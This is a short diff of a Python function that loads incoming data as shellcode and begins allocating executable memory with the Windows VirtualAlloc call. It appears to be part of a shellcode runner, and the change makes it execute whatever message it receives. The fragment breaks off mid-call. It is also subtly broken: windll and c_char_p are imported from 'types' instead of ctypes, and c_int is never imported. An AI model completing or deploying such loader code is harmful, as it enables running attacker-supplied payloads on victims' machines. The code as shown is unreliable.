@@ -5,7 +5,7 @@
 def work( storage, message ) :
 
 	from types import windll, c_char_p
-	shellcode = payload
+	shellcode = message
 	sc = c_char_p(shellcode)
 	# Reserves or commits a region of pages in the virtual address space of the calling process.
 	pointer = windll.kernel32.VirtualAlloc(c_int(0),
